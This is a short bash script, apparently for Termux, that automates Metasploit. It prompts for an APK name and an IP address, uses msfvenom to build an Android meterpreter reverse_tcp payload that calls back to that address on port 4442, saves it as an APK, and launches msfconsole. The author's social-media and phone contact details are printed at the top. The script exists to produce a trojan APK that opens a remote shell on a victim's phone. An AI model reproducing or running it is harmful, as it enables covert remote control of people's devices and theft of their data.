#!/bin/bash
echo "TOOL BY GREYWIRE"
echo "you can contact him on social media for more automation tool"
echo "facebook:https://www.facebook.com/anthonynwachi001"
echo "whatsapp:+2348143164321"
echo "this is a simple script for metasploit automation"
read -p "enter name of apk: " app
read -p "enter your ip address: " IP
msfvenom -p android/meterpreter/reverse_tcp LHOST=$IP LPORT=4442 R > /data/data/com.termux/files/home/storage/downloads/$app
echo "payload created"

msfconsole

